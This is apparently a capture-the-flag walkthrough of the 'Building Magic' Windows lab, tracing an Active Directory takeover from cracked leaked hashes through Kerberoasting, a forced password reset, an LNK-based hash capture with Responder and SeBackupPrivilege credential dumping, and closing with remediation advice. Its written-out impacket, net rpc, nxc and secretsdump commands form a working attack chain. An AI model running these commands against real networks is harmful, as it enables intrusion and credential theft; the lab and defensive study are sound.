---
title: "Building Magic"
date: 2026-01-19
layout: "writeup"
difficulty: "Easy"
excerpt: "Walkthrough for Building Magic"
os: "Windows"
platform: "HackSmarter"
tags: [Hack Smarter, Windows, Active Directory]
comments: false
---

## Executive Summary

Building Magic is an "Easy" difficulty Windows machine that focuses on common Active Directory (AD) attack vectors. The engagement began with the analysis of a leaked database, leading to initial access via **Kerberoasting**. Lateral movement was achieved through **ACL exploitation** (ForceChangePassword) and a **coerced authentication** attack via a malicious `.LNK` file on an SMB share. Final privilege escalation to Domain Admin was accomplished by leveraging the **SeBackupPrivilege** to extract local credentials and identifying administrative password reuse.

<hr class="terminal-divider" style="margin-top: 25px;">

## Tooling Analysis

The following tools were utilized during this engagement:

| Tool                                                                 | Category                                         | Purpose                                                                                  |
|:-------------------------------------------------------------------- |:------------------------------------------------ |:---------------------------------------------------------------------------------------- |
| **Nmap**                                                             | Reconnaissance                                   | Service discovery and port scanning.                                                     |
| **Hash-Identifier / John the Ripper** &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | Password Cracking &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | Identifying hash types and performing offline dictionary attacks.                        |
| **Impacket**                                                         | Exploitation                                     | A suite of Python classes for working with network protocols (GetUserSPNs, SecretsDump). |
| **BloodHound**                                                       | Enumeration                                      | Analyzing AD object relationships and identifying privilege escalation paths.            |
| **NetExec (nxc)**                                                    | Lateral Movement                                 | Automating SMB interactions and generating malicious files.                              |
| **Responder**                                                        | Exploitation                                     | Poisoning LLMNR/NBT-NS/mDNS requests to capture NetNTLMv2 hashes.                        |
| **Evil-WinRM**                                                       | Access                                           | Establishing interactive shells over the Windows Remote Management protocol.             |

<hr class="terminal-divider" style="margin-top: 25px;">

## 1. Enumeration & Reconnaissance

### Credential Analysis

The engagement began with a leaked database dump containing MD5 hashes. 

![BuildingMagic1.png](/images/BuildingMagic1.png)

Using `john`, the hash for the user `r.widdleton` was successfully cracked, providing the plaintext password: `lilronron`.

![BuildingMagic3.png](/images/BuildingMagic3.png)
![BuildingMagic4.png](/images/BuildingMagic4.png)

### Service Scanning

A comprehensive scan was performed to identify the attack surface:

`nmap -A 10.1.156.8 -oA buildingmagic`

![BuildingMagic5.png](/images/BuildingMagic5.png)

The scan confirmed the presence of a Domain Controller running **SMB**, **RPC**, **RDP**, and **WinRM**. Initial access attempts with the `r.widdleton` credentials against RDP and WinRM failed, and SMB access was highly restricted.

![BuildingMagic6.png](/images/BuildingMagic6.png)

<hr class="terminal-divider">

## 2. Initial Access & Lateral Movement

### Kerberoasting

With valid domain credentials, we performed a Kerberoasting attack to identify service accounts with crackable tickets:

`impacket-GetUserSPNs buildingmagic.local/r.widdleton:lilronron -dc-ip 10.1.156.8 -request`

![BuildingMagic7.png](/images/BuildingMagic7.png)

The account `r.haggard` was found to be vulnerable. The service ticket was cracked offline using `john`, yielding the password `rubeushagrid`.

![](C:\Users\kbvau\AppData\Roaming\marktext\images\2026-01-19-09-20-18-image.png)

### ACL Exploitation

After standard access methods failed for the new account (as shown below), BloodHound was utilized to map permissions.

![BuildingMagic8.png](/images/BuildingMagic8.png)

`bloodhound-python -u 'r.haggard' -p 'rubeushagrid' -d BUILDINGMAGIC.LOCAL -ns 10.1.156.8 -c All`

The analysis revealed that `r.haggard` possesses **ForceChangePassword** rights over the user `h.potch`.

![BuildingMagic9.png](/images/BuildingMagic9.png)

The password for `h.potch` was reset via RPC:

`net rpc password h.potch 'NewPassword123!' -U "buildingmagic.local/r.haggard%rubeushagrid" -S 10.1.57.200`

![BuildingMagic10.png](/images/BuildingMagic10.png)

<hr class="terminal-divider">

## 3. Coerced Authentication & Flag Retrieval

### Malicious LNK Upload

Enumeration showed that `h.potch` had write access to the `File-Share` SMB share. 

![BuildingMagic11.png](/images/BuildingMagic11.png)

`smbclient //10.1.57.200/File-Share -U h.potch%NewPassword123!`

![BuildingMagic12.png](/images/BuildingMagic12.png)

To move laterally, `Responder` was started on the attacker machine:

`sudo responder -I tun0 -v`

![BuildingMagic13.png](/images/BuildingMagic13.png)

A malicious `.LNK` file was generated and uploaded to the share using `nxc`:

- `nxc smb 10.1.57.200 -u 'h.potch' -p 'NewPassword123!' -M slinky -o NAME=information.lnk SERVER=10.200.30.233 SHARES=File-Share`

![BuildingMagic15.png](/images/BuildingMagic15.png)

We successfully captured the NetNTLMv2 hash for `h.grangon`.

![BuildingMagic16.png](/images/BuildingMagic16.png)

The hash was cracked (`magic4ever`) using `john`:

![BuildingMagic17.png](/images/BuildingMagic17.png)

Since `h.grangon` is a member of the **Remote Management Users** group, a WinRM session was established to retrieve the user flag.

![BuildingMagic18.png](/images/BuildingMagic18.png)
![BuildingMagic19.png](/images/BuildingMagic19.png)
![BuildingMagic20.png](/images/BuildingMagic20.png)

<hr class="terminal-divider">

## 4. Privilege Escalation to Domain Admin

### SeBackupPrivilege Exploitation

The user `h.grangon` was found to have the **SeBackupPrivilege** enabled. 

![BuildingMagic22.png](/images/BuildingMagic22.png)

This privilege was leveraged to dump the local SAM and SYSTEM hives, which were parsed using `secretsdump`:

`impacket-secretsdump -sam SAM.bak -system SYSTEM.bak LOCAL`

![BuildingMagic23.png](/images/BuildingMagic23.png)

### Administrative Password Reuse

Analysis of the local administrator hash revealed potential reuse. Bloodhound was reviewed to identify the remaining target, `a.flatch`.

![BuildingMagic24.png](/images/BuildingMagic24.png)

A final `evil-winrm` session was established as `a.flatch` (utilizing the local admin password) to retrieve the root flag.

![BuildingMagic25.png](/images/BuildingMagic25.png)
![BuildingMagic26.png](/images/BuildingMagic26.png)

<hr class="terminal-divider" style="margin-top: 25px;">

## Vulnerability Mapping (CWE)

| ID                                   | Vulnerability Name                                                              | CWE Mapping                                          |
|:------------------------------------ |:------------------------------------------------------------------------------- |:---------------------------------------------------- |
| **1**                                | Weak Password Policy (Kerberoasting)                                            | **CWE-521**: Weak Password Requirements              |
| **2** &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | Insecure AD Access Control (ForceChangePassword) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | **CWE-269**: Improper Privilege Management           |
| **3**                                | Coerced Authentication via SMB                                                  | **CWE-294**: Authentication Bypass by Capture-replay |

<hr class="terminal-divider" style="margin-top: 25px;">

## Remediation & Mitigation Strategies

### 1. Hardening Kerberos (NIST AC-1, CIS Control 5.2)

* **Mitigation:** Ensure all service accounts use long, complex passwords (25+ characters).
* **Recommendation:** Migrate service accounts to **Group Managed Service Accounts (gMSAs)** to automate password management.

### 2. ACL & Group Management (NIST AC-6, CIS Control 6.8)

* **Mitigation:** Conduct a thorough audit of Active Directory ACLs to remove "ForceChangePassword" rights granted to non-admin accounts.
* **Recommendation:** Remove sensitive privileges like **SeBackupPrivilege** from standard users to prevent credential database extraction.

### 3. SMB & Network Security (NIST AC-17, CIS Control 4.1)

* **Mitigation:** Disable LLMNR and NBT-NS protocols across the domain.
* **Recommendation:** Implement **SMB Signing** and restrict outbound traffic on port 445 to prevent coerced authentication attacks.
